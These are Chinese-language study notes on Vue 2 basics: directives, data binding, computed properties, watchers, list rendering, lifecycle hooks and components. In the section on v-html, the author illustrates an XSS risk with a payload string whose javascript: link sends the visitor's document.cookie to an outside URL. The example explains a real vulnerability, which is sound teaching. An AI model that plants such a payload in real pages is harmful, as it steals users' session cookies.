---
title: Vue笔记
updated: 2022-01-08 22:33:40
date: 2022-01-08 22:33:40
tags:
categories:
---

vscode插件：Vue 3 snippets
Chrome插件：Vue.js devtools
浏览器强制刷新：shift + 刷新按钮

## 简介
Vue是一套用于构建用户界面的渐进式JS框架，渐进指Vue可以根据应用的复杂程度自底向上逐层的应用，对于简单应用它只需要一个轻量小巧的核心库，对于复杂应用则可以引入各式各样的Vue插件。
它有以下特点：

+ 采用组件化模式，提高代码复用率且更好维护。
![组件化示意](zujianhua.png)
+ 声明式编码，让编码人员直接操作dom，提高开发效率。
![声明式编码](shengmingshi.png)
+ 使用虚拟dom+优秀的diff算法，尽量复用dom节点。
![虚拟dom](xunidom.png)

## 安装
### 不使用cli
在[官网](https://cn.vuejs.org/v2/guide/installation.html)下载Vue.js和Vue.min.js，分别是开发版和生产版。
在html文件head标签内指定路径，引入Vue.js：```<script src="vue.js"></script>```。
通过代码```Vue.config.productionTip = false```调整配置，以阻止 vue 在启动时生成生产提示。其它js代码应该都写在这句话之后。

### 使用cli
环境：Windows10
1.安装node和npm环境

2.安装脚手架vue-cli

```bash
npm install webpack -g
npm install --global vue-cli
vue -V
```
其中webpack是一个包管理工具，也是vue-cli的构建工具。上述命令可以完成webpack的全局安装。如果用nvs工具，可以在C:\Program Files\nodejs\node_global中查看全局安装的vue-cli。
![vue-cli在文件夹中的显示](vuecli.png)

3.构建工程文件
cd到工具区。在工作区中```vue init webpack testproj```以生成webpack脚手架。回车后可能会出现一些提示问题：
+ 项目名称（注意名称中不要出现大写字母，否则会报错）
+ 项目描述（可写可不写，看个人需要）
+ 作者（可写可不写，看个人需要）
+ vue编译，这个选默认即可，运行加编译Runtime + Compiler
+ 是否安装vue-router是否安装vue路由工具
+ 是否使用代码管理工具ESLint管理你的代码
+ 后面几个是测试的工具，需要自己自行了解
+  可以选择在```testproj```工程新建好后系统自动进行初始化，安装package.json中描述的依赖。
初始化完成后，cd进入项目文件夹。```npm run dev```运行项目。运行完成后打开浏览器，输入http://localhost:8080/ ，看到Welcome to Your Vue.js APP页面就可以说明项目脚手架已经初始化完成。
> 若出现报错```'webpack-dev-server' 不是内部或外部命令，也不是可运行的程序或批处理文件```，运行```npm install webpack-dev-server --save-dev```即可解决。


## Vue核心
和基础写法相比，使用Vue可以概括成不变化的都正常写，变化的都要动态指定，也就是前面带冒号，冒号就表示了动态。动态指定的数据都可以在浏览器的vue调试界面中看到。
```html
<body>
    <!-- 准备一个容器 -->
    <div id="demo">
        <h1>hello,{{name.toUpperCase()}}</h1>
        <a v-bind:href="school.url">百度一下</a>
    </div>

    <script>
        Vue.config.productionTip = false // 阻止 vue 在启动时生成生产提示

        // 创建Vue实例
        const vm = new Vue({
            // el指定当前Vue实例为哪个容器服务。建立实例和容器的关系。
            // 值通常为CSS选择器字符串，也可以写作：
            // el: document.getElementById('root'),
            el: '#demo',
            data: { // data中用于存储数据，数据供el所指定的容器去使用
                name: 'Bob',
                school: {
                    url: 'http://www.baidu.com'
                }
            }
        })
    </script>
</body>
```

+ el的两种写法
  1. new Vue时配置el属性``` el: '#root',```
  2. 创建完Vue实例后再通过```v.$mount('#root');```指定el的值，mount有“挂载”之意

+ data的两种写法
  1. 对象式```data: {name:'Bob'}```
  2. 函数式 ```data() { return{name:'Bob'} }```。在使用组件时必须使用函数式。
  > 由Vue管理的函数一定 **不要写箭头函数** ！ 否则this将不再是Vue实例。

### 初识Vue
+ 想让Vue工作，就必须创建一个Vue实例（```new Vue({})```)，且需要传入一个配置对象（```el:'#root',data:{name:'bob'}```）。
+ root容器内的代码依然符合html规范，只不过会混入一些特殊语法（如双括号```{{ }}```。容器的两个作用：1.作Vue模版。2.让Vue知道把工作成果放在何处。
+ root容器内的代码被称为Vue **模版** 。
  + 模版的解析流程为，先有容器，再有Vue实例，实例工作时读到行```el:'#root'```，就会把容器拿过来并进行解析，扫描有没有自己的特殊语法，如果有则作相应的替换。解析完后放回页面，替换掉刚才的整个容器。也就是**模版经过解析后变成目标html片段。**
  + data中的数据发生任何变化，Vue都会把模版重新解析一遍，模版里调用的方法也会重新调用一遍。
+ Vue实例和容器必须一一对应。
+ 真实开发中只有一个Vue实例，并且会配合组件一起使用。

### MVVM模型
MVVM(Model-view-viewmode)，简称vm，是一种软件架构模式，M指模型（model），对应data中的数据；V指视图（View），即模版（页面）；VM指视图模型，对应Vue实例对象（```new Vue({})```）。下图中的两个箭头分别表示监听DOM和数据绑定，即把数据放到指定位置。
![MVVM模型](mmvm.png)
在文档中经常使用vm这个变量名表示Vue实例。

+ data中所有的属性最后都会出现在vm身上。（数据代理）
+ vm身上所有的属性，Vue**原型**身上所有的属性，在Vue模版中都可以直接使用。

### 数据代理
+ 方法**Object.defineproperty()**：第一个参数-给哪个对象添加属性；第二个参数-要添加的属性叫什么名字；第三个属性-配置项
```javascript
let number = 18;
let person = {
  name:'bob',
}
Object.defineProperty(person, 'age', {
  // value: 18,
  // enumerable: true, // 控制属性是否可以枚举，默认值是false
  // writeble: true, // 控制属性是否可以被修改，默认值是false
  // confugurable: true, // 控制属性是否可以被删除，默认值是false

  // 当读取person的age属性时，get函数(getter)就会被调用且返回值是age的值
  get: function hihi() {
    return number;
  },

  // 当修改person的age属性时，set函数(setter)就会被调用且会收到修改的值
  set(value) {
    number = value;
  }
})
console.log(person);
```

+ 数据代理：通过一个对象代理另一个对象中属性的操作（读/写），好处是可以更加方便的操作data中的数据（否则就得```{{_data.age}}```。vm.data其实就是我们写的那个data。也可以在构造Vue实例前定义一个对象data，再将这个data给vm：```const vm = new Vue({el: '#demo',data})```。此时vm.\_data = options.data = data，options就是new Vue时传入的配置对象。）。图中橙色和紫色的双箭头就是数据代理，每条线都既利用了get也利用了set。
以name为例，它通过getter读取到data（\.data）里的name，在修改vm里的name时通过setter也会将data（\.data）里的name进行修改。
\.data里的内容是数据劫持的后果。
![数据代理](shujvdaili.png)
数据代理的基本原理：通过Object.defineproperty()把data对象中所有属性添加到vm上，再为每个添加到vm上的属性都指定一个getter/setter，在getter/setter内部去操作（读/写)data中对应的属性，

### template
标签```<template></template>```最大的特点就是不影响结构，类似于小程序中的```<block></block>```。最终页面渲染的时候通过检查元素查看，可以看到并没有实际的```<template></template>```结构。

需要注意的是template只能配合```v-if```，不能配合```v-show```。
### 模版语法
+ 插值语法：用于解析标签体内容（标签体内使用）
写法为```{{xxx}}```。xxx为js**表达式**，可直接读到data中的所有属性。
注意插值插的是函数返回值时，需要加括号：```{{fullName()}}```。

+ 指令语法：用于解析标签（标签属性、标签体内容、绑定事件等）
都是以```v-```开头，有v-bind、v-model、v-on等。

+ 数据绑定：分为单向绑定和双向绑定
单向绑定：```v-bind:href="xxx"```，数据只能从data流向页面。它可以简写为```:href="xxx"```。xxx也要是js表达式，且可以直接读取到js中的所有属性。
双向绑定：```v-model:value="name"```，数据能从页面和data间双向流动，一般都应用在表单类元素中。它可以简写为```v-model="name"```，因为```v-model```默认收集的就是value值。

### 事件处理
+ 使用v-on:xxx（简写为@xxx，xxx为事件名）绑定事件，如```v-on:click="showInfo"``` 配合```new Vue({methods:{showInfo() alert('hell0')}})```。
  > 绑定事件的时候"@xxx="的后面可以加一些简单的语句，如```@click="istrue = !istrue;x++"```。

+ 事件的回调需要配置在methods对象中，最终会在vm上。
+ 注意methods中配置的函数 **不要用箭头函数！** 否则this就不是vm了。<span style="color:red">methods中配置的函数都是被Vue管理的函数，函数里this的指向是vm或组件实例对象。</span>
+ @click="demo"和@click="demo(\$event)"效果一致，但后者可以传参。\$event表示参数传入了event对象，如果使用前者但定义函数时传入了一个或多个参数，会自动给第一个参数复制为event其它为undefined。

#### 事件修饰符

1. prevent：阻止默认事件（常用）
2. stop：阻止事件冒泡（常用）
3. once：事件只触发一次（常用）
4. capture：使用事件的捕获模式
5. self：只有event.target是当前操作的元素时才触发事件
6. passive：事件的默认行为立即执行，无需等待事件回调执行完毕，移动端使用较多
语法形如```@click.prevent="showInfo"```。
修饰符也可以连续写，```@click.prevent.stop="showInfo"```意为先阻止默认行为再阻止冒泡。

#### 键盘事件

有```@keyup```和```@keydown```，前者更常用。
在```@keyup="showInfo"```中的函数showInfo里使用```e.target.value```或```e.key```可以获取按下的健名，使用```e.keyCode```可以获取按键的编码。
通过语法```@keyup.enter```使用按键别名，事件在具有该别名的按键抬起时才会触发。

+ Vue提供的常用的按键别名：回车——enter，删除——delete（捕获“删除”和“退格”键），退出——esc，空格——space，换行——tab，上——up，下——down，左——left，右——right。
> 注意tab键本身有切换光标焦点的功能，使用 @keyup.tab达不到预期的效果，tab必须用keydown使用。

+ Vue未提供别名的按键可以使用按键原始的key值绑定（通过e.key获取），但注意要转为kebab-case（短横线命名，如e.key获取到的名字是CapsLock，需要写为caps-lock。）
+ 系统修饰键（用法特殊）：ctrl、alt、shift、meta（win的徽标，mac的command）
  1. 配合keyup使用：按下修饰键的同时，再按下其他任意键随后释放该键，事件才被触发。
  2. 配合keydown使用：正常触发事件。
    
    > 也适用于更强的要求，如按下ctrl+a才会触发事件：@keyup.ctrl.a。.
+ （不推荐）可以使用keyCode去指定具体的按键，如@keydown.13。
+ 通过```Vue.config.keyCodes.自定义键名 = 键码```，可以去定制按键别名

### 计算属性
何为属性？Vue认为data里的东西就是属性，有属性名和属性值。
计算属性就是要用的属性不存在，需要拿已有**属性**（Vue管理的属性才可以，不能是随便一个变量）去加工/计算并生成一个全新的属性。底层原理是借助了Object.defineproperty方法提供的getter和setter。优势是与methods实现相比内部多了一个缓存机制（复用），效率更高且调试方便。
计算属性最终会出现在vm上，直接调用即可；且如果计算属性需要被修改（vm.sum='张+三' ），就必须写set函数响应修改，**且set函数中需要引起计算时依赖的数据发生改变**。
计算属性不能放到data里，而需要放到另一个配置项computed里，并把计算过程放入一个 **对象** ：
```javascript
new Vue({
  el:'#root',
  data:{a:3,b:2},
  computed:{
    sum:{
      get(){ 
        return this.a + '-' + this.b;
      }，
      set(value){
        const arr = value.split('-');
        this.a = arr[0];
        this.b = arr[1];
      }
    }
  }
})
```
计算属性对象中get()函数的作用：当有人读取sum时就会被调用，且返回值作为sum的值。
get()什么时候调用？1. 初次读取sum的值时。2.所依赖的数据（a或b）发生变化时。
set()什么时候调用？sum的值被修改时。

当计算属性确定只有getter而没有setter时即**只有读取需求，没修改需求**时可以用简写属性。即不用写作配置对象，而是写作函数，此时函数就相当于getter：
```javascript
// 简写属性
computed:{
  sum(){
    return this.a + '-' + this.b;
  }
}
```

需要注意的是计算属性靠的就是对应属性为名字的函数的返回值，但办不到让它等一等再有返回值。所以<span style='color:red'>计算属性中不能开启异步任务去维护数据！ 而watch可以。</span>

### 监视
监视属性watch：当被监视的属性变化时，回调函数自动调用，进行相关操作。
> 监视的属性必须存在才能进行监视！

监视的两种写法：(1) new Vue时传入watch配置  (2) 通过vm.$watch监视
```javascript
// 监视属性
watch:{
  // 这里的key名可以使用简写方式，不加引号。对象里的key是字符串。
  // 但如果需要监视的属性是xxx.xxx，就需要加引号写作'xxx.xxx'的形式。
  // 不加引号的前提是属性名必须满足变量取名的要求。
    istrue:{
      // handler:当istrue发生改变时调用
      handler(newValue,oldValue){ 
        console.log('istrue被修改了',newValue,oldValue)
      }
      // 初始化时调用一下handler
      immediate:true,
    }
  }
```

除了handler配置项，也可以用vm监视，首先要保证实例已经创建完毕。
```javascript
vm.$watch('istrue',{ // 注意这里的key名需要加引号.对象里的key是字符串。
  // 这个括号里的内容和上面写在watch里的内容一模一样
  istrue:{
      // handler:当istrue发生改变时调用
      handler(newValue,oldValue){ 
        console.log('istrue被修改了',newValue,oldValue)
      }
      // 初始化时调用一下handler
      immediate:true,
})
```

至于这两种方式的选择，如果在创建实例时就已经明确需要监视谁，就使用watch属性；如果后续根据用户行为再决定需要监视谁，就调用第二种api方式。

#### 深度监视
如果data中有形如下面的‘numbers’数据，那么numbers就相当于是data中的一个key，它的value（a:1,b:1）就是这个key的地址。
<span style="color:red">虽然Vue默认可以监视到data中多级数据内部值的改变，但它提供的watch默认不能。</span>
如果想让它可以，则需要利用```deep:true```属性。
```javascript
const vm = new Vue({
  el:'#root',
  data:{
    numbers:{ // 比如这个括号内的部分的地址是0x123，顺着0x123可以找到ab并改变它们的值。但只要0x123依然是它们的地址，numbers就会被认为是没有改变。
      a:1,
      b:1
    }
  }，
  watch:{
    numbers:{
      deep:true,
      handler(){
        console.log('numbers改变了')
      }
    }
  }
})
```

#### 监视属性的简写
在配置项里没有deep、immediate等属性，只需要响应者handler时可以使用简写写法。
```javascript
watch:{
  // 正常写法
  /* numbers:{
    istrue:{
      handler(newValue,oldValue){ 
        console.log('istrue被修改了',newValue,oldValue)
      }
    }
  }*/
  
  // 简写写法,写成一个函数，参数照样传
  istrue(newValue,oldValue){
    console.log('istrue被修改了',newValue,oldValue)
  }
}
```
```javascript
// 正常写法
vm.$watch('istrue',{ 
  istrue:{
    handler(newValue,oldValue){ 
      console.log('istrue被修改了',newValue,oldValue)
    }
  }
})

// 简写写法：第二个函数不传配置项，而是函数。参数照样传。
vm.$watch('istrue',function(newValue,oldValue){
  console.log('istrue被修改了',newValue,oldValue)
})
```
#### computed和watch的区别
1. computed能完成的功能watch都可以完成
2. watch能完成的功能computed不一定能完成，比如watch可以进行异步操作

两个重要的原则：
1. 被Vue管理的函数最好写成普通函数，这样this的指向才是vm或组建实例对象
2. 所有不被Vue管理的函数（**定时器的回调函数、ajax的回调函数、promise的回调函数等** ），最好写成箭头函数，这样this的指向才是vm或组建实例对象

#### 用监视属性实现异步任务
计算属性中不能开启异步任务去维护数据，需要用监视属性。
之所以要用箭头函数，是因为定时器虽然是在fullname中开启的，但定时器所指定的回调是不受vue控制的，而是受浏览器的定时器管理模块控制的，最后到点了也是浏览器引擎调用的定时器所指定的回调函数。
如果用普通函数，因为定时器的回调函数是JS引擎调的，而且它调的时候this已经指定好了，就是window；如果用箭头函数，也是JS引擎调的这个函数，但由于写成了箭头函数，它就没有了自己的this，就要去往外找（箭头函数本身没有this指向，会向上查找）；往外找就找到了firstName的this。而firstName是Vue所管理的函数，又因为它是普通函数，所以它的this就是vm。
```javascript
watch:{
  firstName(val){
    setTimeout(() => {
      // 测试this
      // condole.log(this)
      this.fullname = val + '-' + this.lastName
    },1000);
  },
  lastName(val){
      this.fullname = val + '-' + this.lastName
  }
}
```

### class与style绑定
+ class样式：写法为```:class="xxx"```，xxx可以是字符串、对象、数组。
+ style样式：```:style="{fontSize:xxx}"```，其中xxx是动态值；```:style="[a,b]"```，其中a、b是样式对象。（样式对象的特点就是样式对象中的属性名都不能瞎写，得是存在的css属性。下面例子4、5中的对象就是样式对象。）

1. 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定。比如下面的例子，已知必须要从mood里读东西，但读的是什么不确定。
```html
<body>
  <div id = "root">
    <div class="basic" :class="mood" @click="changeMood">Hello</div>
  </div>

  <script type="text/javascript">
    new Vue({
      el:'#root',
      data:{
        mood:'normal'
      },
      methods:{
        changeMood(){
          this.mood = 'happy'
        }
      }
    })
  </script>
</body>
```
2. 绑定class样式--数组写法，适用于：要绑定的样式个数不确定，名字也不确定。把一个数组传给v-bind:class，这样可以应用一个class列表：
```html
<div class="basic" :class="classArr">Hello</div>
```
```javascript
data:{classArr:['myclass1','myclass2','myclass3']},
```
3. 绑定class样式--对象写法 ，适用于：要绑定的样式个数确定，名字也确定，但要动态决定用不用。
```html
<div class="basic" :class="classObj">Hello</div>
```
```javascript
data:{
  classObj:{
    myclass1:ture,
    myclass2:false
  }
},
```
也可以写为：
```html
<div class="basic" :class="{myclass1:a,myclass2:b}">Hello</div>
```
```javascript
data:{a:ture,b:false},
```
4. 绑定style样式--对象写法
```html
<div class="basic" :style="{fontsize: fsize+'px'}">Hello</div>
```
```javascript
data:{fsize:40},
```
可以更直观地写为：
```html
<div class="basic" :style="styleObj">Hello</div>
```
```javascript
data:{
  styleObj:{ fontsize:'40px',color:'red' }
},
```
5. 绑定style样式--数组写法 
```html
<div class="basic" :style="styleArr">Hello</div>
```
```javascript
data:{
  styleArr:[
    { fontsize:'40px',color:'red',},
    { backgroundcolor:'orange'}
  ] 
}
```
这种写法不如：
```html
<div class="basic" :style="[styleObj1,styleObj2]">Hello</div>
```
```javascript
data:{
  styleObj1:{
    fontsize:'40px',color:'red',
  },
  styleObj2:{
    backgroundcolor:'orange'
  },
},
```

### 条件渲染
+ v-if：适用于切换频率较低的场景。
  特点：不展示的DOM元素直接被移除。
  注意：v-if可以和v-else-if、v-else一起使用，但要求结构不能被“打断”。其含义类似于```if if if```和```if else-if else```。
  1. v-if = “表达式”
  2. v-else-if = “表达式”
  3. v-else = “表达式”
+ v-show：适用于切换频率较高的场景。
  ```v-show=```的等号后面是```true```或```false```，但也可以写一个表达式，根据表达式的值为真或假来给v-show赋值。也可以写```v-show="a"```，这会让Vue去下面的data中找a，可以通过调整a实现动态的调整。
  特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉。其底层实现是通过调整```display:none```。
+ 使用v-if时元素可能无法获取到，而使用v-show一定可以获取到。
+ 需要注意的是， template只能配合```v-if```，不能配合```v-show```。

### 列表渲染
+ v-for：加在谁身上就通过遍历的方式生成谁。（有一堆谁就给谁加v-for）
  1. 用于展示列表数据
  2. 语法：```v-for="(item，index) in xxx" :key="yyy"```（in可以用of代替）（注意key是唯一的）
  3. 可遍历数组(p,index)、对象(value,key)、字符串(char,index)（用的很少，value是每个单个字符）、指定次数(number,index)（非常少见 ，）

形参可以有不止一个，默认第一个是每一项内容（value），第二个是索引（index，如果遍历数组就是从0开始的数字；遍历对象就是每一个属性名；遍历字符串也是从0开始的数字）。使用多个形参最好用小括号括起来。

> 只要用了遍历（v-for）方式去生成多个同样结构的数据，就必须给每个结构作一个唯一标识，```:key```就是它们的标识。

```html
<body>
  <div id="root">
    <ul>
      <!-- 下面的p是一个形参，这个形参可以直接在li标签体里面使用。 -->
      <!-- 传递多个形参： -->
      <!--   <li v-for="(p,index) in persons" :key="index">   -->
      <li v-for="p in persons" :key="p.id">  
        {{p.name}}-{{p.age}} 
      </li>
    <ul>
  <div>
  
  <script>
    new Vue({
      el:'#root',
      data:{
        persons:[ // 每个人都应该有唯一的标识：id，一个人的各种信息应该封装在一个对象中
          {id:'001',name:'张三',age:18},
          {id:'002',name:'李四',age:19}
        ]
      }
    })
  </script>
</body>
```

#### 列表过滤
方法```filter()```创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素。其中的return是过滤条件，把符合条件的过滤出来。
判断一个字符串中是否含有指定字符：使用属性```indexOf```。它可以判断字符出现的索引位置，没出现则返回-1。不会改变原数组，而是会把结果存储到新的数组中。 
1.用监视属性watch实现：
```html
<input type="text" placeholder="请输入关键字" v-model="keyWord">
<ul>
  <li v-for="(p,index) in filPersons" :key="index">
    {{p.name}}-{{p.age}}-{{p.sex}}
  </li>
</ul>
```
```javascript
data:{
  keyWord:'',
  persons:[
    {},{},{},
  ],
  filPersons:[], // 用来保管过滤出的数据而不对原数组进行修改
},
watch:{
  keyWord:{
    immediate:true,  // 初始化时让handler调用一下；此时的val是空串，而任何字符串都包含空串，所以所有数据都符合过滤条件。
    handler(val){
      this.filPersons = this.persons.filter((p)=>{
      return p.name.indexOf(val) !== -1 
      })
    }
  }
}
```

2.用计算属性computed实现：
```javascript
data:{
  keyWord:'',
  persons:[
    {},{},{},
  ],
  filPersons:[], // 用来保管过滤出的数据而不对原数组进行修改
},

computed:{
  filPersons(){  // 只要keyWord变化，filPersons()就会重新执行
    return this.persons.filter((p)=>{
      return p.name.indexOf(this.keyWord) !== -1 
    }
  }
},
```


#### 列表排序


###  key的原理
key的作用可以理解为就是给节点做一个标识，相当于人类社会中的身份证号。
在原列表的最前面添加一个新的person项，用index作为key，为什么会出错？有问题的流程和id作为key的正确流程如下图所示：
![问题流程](key.png)
![正确流程](keyid.png)
如果遍历时根本没有写key，Vue则会自动让index作为key。
（面试题）react、vue中的key有什么作用？
1. 虚拟DOM中key的作用： 
  key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
2. 对比规则：
  1. 旧虚拟DOM中找到了与新虚拟DOM **相同的key** ：
    1. 若虚拟DOM中内容没变，直接使用之前的真实DOM！（之前的旧虚拟dom中肯定已经转过一次了）
    2. 若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
  2. 旧虚拟DOM中未找到与新虚拟DOM相同的key：
    创建新的真实DOM随后渲染到页面。 
3. 用index作为key可能会引发的问题：
  1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作：
    会产生没有必要的真实DOM更新 ==> 界面效果没问题，但效率低。
  2. 如果结构中还包含输入类的DOM：
    会产生错误DOM更新 ==> 页面有问题。
4. 开发中如何选择key：
  1. 最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值
  2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。 


### Vue监视数据
1. Vue会监视data中所有层次的数据。
2. 如何监测对象中的数据？
  通过setter实现监视，且要在newVue时就传入要监测的数据。
  1. 对象中后追加的属性，Vue默认不做响应式处理
  2. 如需给后添加的属性做响应式，请使用如下API：
    Vue.set(target,propertyName/index,value)或
    vm.$set(target,propertyName/index,value)
3. 如何监测数组中的数据？
  通过包裹数组更新元素的方法实现，本质是做了两件事：
  1. 调用原生对应的方法对数组进行更新
  2. 重新解析模版进而更新页面
4. 在Vue修改数组中的某个元素一定要用如下方法：
  1. 使用这些API：push()、pop()、shift()、unshift()、splice()、sort()、reverse()
  2. Vue.set() 或 vm.$set()

特别注意：<span style='color:red'>Vue.set() 和 vm.$set()不能给vm或vm的数据对象添加属性！！！</span>

### 收集表单数据
+ 若```<input type="text"/>```，则v-model收集的是value值，用户输入的就是value值。
+ 若```<input type="radio"/>```，则v-model收集的是value值，且要给标签配置value值。
+ 若```<input type="checkbox"/>```
  1. 没有配置input的value属性，那么收集的就是checked（勾选/未勾选，是boolean）
  2. 配置input的value属性：
    （1）v-model的初始值是非数组，那么收集的就是checked（勾选/未勾选，是boolean）
    （2）v-model的初始值是数组，那么收集的就是value组成的数组

> v-model的三个修饰符：
> lazy：失去焦点再收集数据；number：输入字符串转为有效的数字；trim：输入首尾空格过滤
> 通过 JSON.stringify() 把 JavaScript 对象转换为字符串。

### 过渡&动画


### 过滤器
定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）
语法：
1.注册过滤器：全局过滤器```Vue.filter(name,callback)``` 或 局部过滤器```new Vue{filters:{}}```
2.使用过滤器：```{{ xxx | 过滤器名}}``` 或 ```v-bind:属性 = ”xxx｜过滤器名“```

过滤器也可以接收额外参数，如
```html
<h3> 现在是：{{time | timeFormater('YYYY_MM_DD')}}</h3>
```
```javascript
    timeFormater(value,str='YYYY年MM月DD日' HH：mm：ss'){
        return  dayjs(value).format(str)
    }
```

多个过滤器可以串联；而且过滤器并没有改变原本的数据，只是产生新的对应的数据。

### 内置指令与自定义指令
#### 内置指令
（一）
v-bind：单向绑定解析表达式，可简写为```:xxx```
v-model：双向数据绑定
v-for：遍历数组/对象/字符串
v-on：绑定事件监听，可简写为```@```
v-if：条件渲染（动态控制节点是否存在）
v-else：条件渲染（动态控制节点是否存在）
v-show：条件渲染（动态控制节点是否展示）

（二）
v-text：向其所在的节点中渲染文本内容。与插值语法```{{xx}}```的区别在于v-text会替换掉节点中的内容，```{{xx}}```则不会。

v-html：向指定节点中渲染包含html结构的内容。与插值语法```{{xx}}```的区别在于v-html会替换掉节点中 **所有** 的内容，```{{xx}}```则不会；且v-html可以识别html结构。
**特别注意：<span style='color:red'>v-html有安全性问题！1.在网站上动态渲染任意html都是非常危险的，容易导致xss攻击；2.一定要在可信的内容上使用v-html，永远不要在用户提交的内容上使用！</span>**比如非法拿取cookie等操作。cookie简略图示如下：
![cookie1](cookie.png)
![cookie2](cookie.png)
在浏览器中的Application/储存空间/存储中可以查看cookie，右键条目可以进行添加删除等操作。Chrome的插件"Cookie-Editor"可以让对cookie的操作更加方便。
在html文件中，如果使用了v-html，进行下列操作就可以简单的拿到其他浏览器的cookie：
```html
<div id="root">
    <div v-html="str"></div>
</div>
```
```javascript
new Vue{
    el:'#root',
    data:{
         str:'<a      	href=javascript:location.href="http://www.baidu.com?"+document.cookie>快点击我！你的cookie要被拿走啦！'
    }
}
```

v-cloak（没有值）：本质上是一个特殊属性，Vue实例创建完毕并接管容器后会删掉v-cloak属性。使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

v-once（没有值）（只会执行一次）：v-once所在节点在初次被动态渲染后就视为静态内容了。以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

v-pre：跳过其所在节点的编译过程。可利用它跳过没有使用指令语法、没有使用插值语法的节点，会加快编译。

#### 自定义指令
+ 定义语法

1.局部指令：
```javascript
  new Vue({
  directives:{指令名：配置对象}
  })
  // 或
  new Vue({
  directives:{指令名：回调函数}
  })
```
2.全局指令：
```Vue.directive{指令名,配置对象}``` 或 ```Vue.directive{指令名,回调函数}``` 

+ 配置对象中常用的3个回调：
  1. ```.bind```：指令与元素成功绑定时调用。
  2. ```.inserted```：指令所在元素被插入页面时调用。（比如获取焦点就在此处）
  3. ```.update```：指令所在模版结构被重新解析时调用。
+ 注意：
  1. 指令定义时不加v-，但使用时要加v-；
  2. 指令名如果是多个单词，要使用kebab-case命名方式，不要使用camelCase命名。
  3. 如果不使用回调，指令会在两种时刻执行：1.指令与元素成功绑定时（一上来） 2.指令所在的模板被重新解析时。

### 插件
用于增强Vue。本质是包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

定义插件：
```javascript
对象.install = function(Vue,options){
    // 1. 添加全局过滤器
    Vue.filter(....)
    
    // 2. 添加全局指令
    Vue.directive(....)
    
    // 3. 配置全局混入（混合）
    Vue.mixin(....)
    
    // 4. 添加实例方法
    Vue.prototype.$myMethod = function(){...}
    Vue.prototype.$myProperty = xxxx
} 
```
使用插件：```Vue.use()```


### 自定义插件

## 生命周期
> 在 http://www.atguigu.com/wp-content/uploads/2020/01/web20-1-2-2.png 查看生命周期图示。

是Vue在关键时刻帮我们调用的一些特殊名称的函数。生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
<span style='color:red'>生命周期函数中的this指向是vm 或 组建实例对象。</span>
生命周期函数写在与methods配置项同级的地方。
![生命周期](shengming1.png)
![生命周期](shengming2.png)

除了路由相关的那三个，一共有4对（8个）生命周期钩子。
将要创建（数据监测、数据代理的创建）——```beforeCreate()```
创建完毕——```created()```
将要挂载——```beforeMount()```
<span style='color:red'>挂载完毕</span>——```mounted()```
将要更新——```beforeUpdate()```
更新完毕——```updated()```
<span style='color:red'>将要销毁</span>——```beforeDestroy()``` 
销毁完毕——```destroyed()```
### 挂载流程
上面的第一张图即为挂载流程。

### 更新流程
![生命周期](shengmingupdate.png)

### 销毁流程
![生命周期](shengmingdestroy.png)
关于销毁Vue实例：
1.销毁后借助vue开发者工具看不到任何信息。
2.销毁后 **自定义** 事件会失效，但 **原生** DOM事件依然有效。
3.一般不会在beforeDextroy操作数据，因为即使操作数据也不会再触发更新流程了。

### 常用的生命周期钩子
1. mounted：Vue完成模板的解析并把 **初始的真实DOM元素** 放入页面（挂载完毕）后调用。在vm的工作过程中mounted只会被调用一次。
    用于发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
2. beforeDestroy：当```vm.$destroy()```调用时调用此生命周期函数（虽然很少调，让张三自鲨不太好）。此时，vm中所有的data、methods、指令等都处于可用状态，马上要执行销毁过程。但 **此时对数据的修改不会再触发更新。**
    用于清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。


## Vue组件化
模块：向外提供特定功能的js程序，一般就是一个js文件。由于js文件很多很复杂，模块化可以实现js的复用，简化js的编写，提高js运行效率。
当应用中的js都是以模块来编写的，那么这个应用就是一个模块化的应用。

传统方式和组件化方式编写应用可以如下图所示，其中传统方式的左侧HTML文件是第二个需求所用到的：
![传统方式](zujian-chuantong.png)
![传统方式](zujian-zujian.png)

组件：用来实现 **局部** （特定）功能效果的 **代码** 和 **资源** 的 **集合**（html/css/js/image等）。由于一个界面的功能很复杂，组件化可以实现编码的复用，简化项目编码，提高运行效率。
当应用中的功能都是以多组件的方式来编写的，那么这个应用就是一个组件化的应用。

单文件组件指一个文件中只包含一个组件，文件和组件一一对应，一个文件就是一个组件(a.vue)；非单文件组件指一个文件中包含有n个组件(a.html)。
```html
<body>
  <div id="root">
    <!-- 第三步：编写组件标签 -->
    <xuexiao></xuexiao>
    <hr>
    <!-- 第三步：编写组件标签 -->
    <xuesheng></xuesheng>
  </div>
  <script>
  // 第一步：创建school组件
  const school = Vue.extend({
    name:'BUT', // 如果在此处指定名字，就指定了组件在开发者工具中呈现的名字，注册时不能再更改。
    template:`
      <div>
        <h2>学校名称:{{schoolName}}</h2>
        <h2>学校地址:{{address}}</h2>
        <button @click="showName">显示学校名</button>
      </div>
    `,
    data(){
      return{
        schoolName:'BUT',
        address:'beijing'
      }
    },
    methods:{
      showName(){
        alert(this.schoolName)
      }
    },
  })

  // 第一步：创建student组件
  const student = Vue.extend({
    template:`
      <div>
        <h2>学生姓名:{{studentName}}</h2>
        <h2>学生年龄:{{age}}</h2>
      </div>
    `,
    data(){
      return{
        studentName:'BUT',
        age:'beijing'
      }
    }
  })

  // 创建vm
  new Vue({
    el:'#root',
    // 第二步：注册组件
    components:{ // 局部注册xuexiao和xuesheng;只有#root可以用
      xuexiao:school,  
      xuesheng:student
    }
  })
  new Vue({
    el:'#root2',
  })
  
